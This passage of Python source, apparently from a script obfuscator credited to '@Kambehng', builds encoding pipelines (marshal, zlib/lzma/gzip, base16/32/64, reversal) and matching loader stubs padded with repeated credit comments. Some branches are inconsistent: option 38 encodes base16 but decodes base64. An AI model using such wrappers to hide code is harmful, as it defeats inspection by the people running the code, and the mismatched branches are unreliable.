@Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('base64').b16decode(__[::-1])));"
    elif option == 30:
        xx = "b32(gzi(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('base64').b32decode(__[::-1])));"
    elif option == 31:
        xx = "b64(gzi(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('base64').b64decode(__[::-1])));"
    elif option == 32:
        xx = "b16(zlb(lzm(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1]))));"
    elif option == 33:
        xx = "b32(zlb(lzm(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1]))));"
    elif option == 34:
        xx = "b64(zlb(lzm(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));"
    elif option == 35:
        xx = "b16(zlb(gzi(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1]))));"
    elif option == 36:
        xx = "b32(zlb(gzi(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1]))));"
    elif option == 37:
        xx = "b64(zlb(gzip(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));"
    elif option == 38:
        xx = "b16(zlb(lzm(gzi(mar(data.encode('utf8'))))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))));"
    elif option == 39:
        xx = "b32(zlb(lzm(gzi(mar(data.encode('utf8'))))))[::-1]"
